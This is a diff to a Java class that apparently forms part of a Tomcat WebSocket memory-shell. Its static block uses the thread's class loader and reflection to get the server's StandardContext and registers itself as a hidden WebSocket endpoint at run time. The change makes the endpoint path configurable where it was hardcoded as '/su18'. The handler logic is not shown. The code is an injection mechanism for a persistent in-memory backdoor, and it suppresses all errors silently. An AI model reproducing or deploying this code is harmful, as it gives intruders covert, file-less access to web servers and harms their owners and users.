@@ -16,12 +16,13 @@ import java.lang.reflect.Field;
 
 public class TWSMSFromThread extends Endpoint implements MessageHandler.Whole<String> {
 
+	public static String pattern;
+
 	public TWSMSFromThread() {
 	}
 
 	static {
 		try {
-			String                wsName                = "/su18";
 			WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
 			StandardContext       standardContext;
 
@@ -37,10 +38,10 @@ public class TWSMSFromThread extends Endpoint implements MessageHandler.Whole<St
 				standardContext = (StandardContext) field2.get(root);
 			}
 
-			ServerEndpointConfig build     = ServerEndpointConfig.Builder.create(TWSMSFromThread.class, wsName).build();
+			ServerEndpointConfig build     = ServerEndpointConfig.Builder.create(TWSMSFromThread.class, pattern).build();
 			WsServerContainer    attribute = (WsServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
 			attribute.addEndpoint(build);
-			standardContext.getServletContext().setAttribute(wsName, wsName);
+			standardContext.getServletContext().setAttribute(pattern, pattern);
 		} catch (Exception ignored) {
 		}
 	}
